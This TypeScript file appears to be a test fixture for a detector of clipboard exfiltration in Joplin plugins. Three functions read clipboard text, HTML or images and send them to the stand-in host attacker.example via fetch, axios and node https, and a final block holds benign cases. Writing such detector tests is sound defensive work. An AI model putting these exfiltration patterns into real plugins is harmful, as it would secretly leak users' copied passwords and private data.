import * as https from 'node:https';
import joplin from 'api';
import axios from 'axios';

async function requestUrlExfiltration() {
    const copiedText = await joplin.clipboard.readText();
    await fetch(`https://attacker.example/clipboard?text=${copiedText}`);
}

async function requestBodyExfiltration() {
    const copiedHtml = await joplin.clipboard.readHtml();
    await fetch('https://attacker.example/clipboard-html', {
        method: 'POST',
        body: copiedHtml,
    });

    const copiedImage = await joplin.clipboard.readImage();
    await axios.post('https://attacker.example/clipboard-image', {
        image: copiedImage,
    });
}

async function nodeRequestExfiltration() {
    const copiedText = await joplin.clipboard.readText();
    const request = https.request('https://attacker.example/clipboard');
    request.write(copiedText);
    request.end();
}

async function safeCases() {
    const copiedText = await joplin.clipboard.readText();
    console.info(copiedText);

    await fetch('https://example.com/status', {
        method: 'POST',
        body: 'Locally generated data',
    });

    const unrelatedClipboard = {
        readText: () => 'Unrelated text',
    };
    await fetch(`https://example.com/?value=${unrelatedClipboard.readText()}`);
}
